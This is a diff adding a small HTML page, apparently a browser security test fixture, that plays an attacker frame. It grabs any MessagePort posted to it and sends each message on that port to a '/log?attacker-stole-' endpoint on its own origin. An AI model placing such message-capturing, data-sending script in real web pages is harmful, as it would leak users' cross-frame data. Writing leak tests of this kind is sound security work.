@@ -1,0 +1,7 @@
+<!doctype html><script>
+  // Reports any port it's sent and the messages on it.
+  addEventListener("message", (e) => {
+    const port = e.ports[0];
+    if (port) port.onmessage = (m) => fetch(location.origin + "/log?attacker-stole-" + encodeURIComponent(JSON.stringify(m.data)));
+  });
+</script>
